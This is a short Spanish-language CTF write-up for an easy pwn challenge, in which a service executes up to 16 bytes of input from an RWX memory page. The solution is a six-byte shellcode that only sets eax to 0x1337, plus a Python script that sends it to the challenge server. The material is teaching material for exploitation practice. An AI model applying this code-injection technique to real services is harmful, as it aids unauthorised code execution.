# Shellcode

| | |
|---|---|
| **Categoría** | Pwn |
| **Dificultad** | Fácil |
| **Puntos** | 100 |
| **Reto #** | 14 |
| **Conexión** | `nc chals.tropicalhunters.com 9008` |

## Descripción

El servicio reserva una página de memoria con permisos de lectura, escritura y ejecución (`mmap RWX`), lee hasta 16 bytes desde stdin y los ejecuta como código máquina. Si el código retorna `0x1337` en `eax`, entrega la flag.

## Análisis

```c
buf = mmap(NULL, 0x1000,
           PROT_READ | PROT_WRITE | PROT_EXEC,
           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

read(0, buf, 16);
result = ((int(*)())buf)();

if (result == 0x1337)
    print_flag();
```

Solo se necesita shellcode que cargue `0x1337` en `eax` y retorne. No hay bypass de NX porque la página ya es ejecutable.

## Solución

**Shellcode (6 bytes):**

```asm
b8 37 13 00 00   ; mov eax, 0x1337
c3               ; ret
```

```python
import socket

shellcode = b'\xb8\x37\x13\x00\x00\xc3'

s = socket.socket()
s.connect(("chals.tropicalhunters.com", 9008))
s.recv(1024)
s.sendall(shellcode)
print(s.recv(1024).decode())
```

> 🚩 **Flag:** omitida intencionalmente. Seguí los pasos para obtenerla.

## Takeaways

- Una página `mmap(PROT_RWX)` es ejecutable directamente; no hace falta bypass de NX ni DEP.
- Shellcode mínimo: `mov eax, <valor>` + `ret` = 6 bytes, dentro del límite de 16.
- Convención x86-64: valor de retorno de función en `rax`/`eax`.

---
*Tropical Hunters CTF — Writeup por [Fabián Bustamante](https://github.com/fbustamante55)*
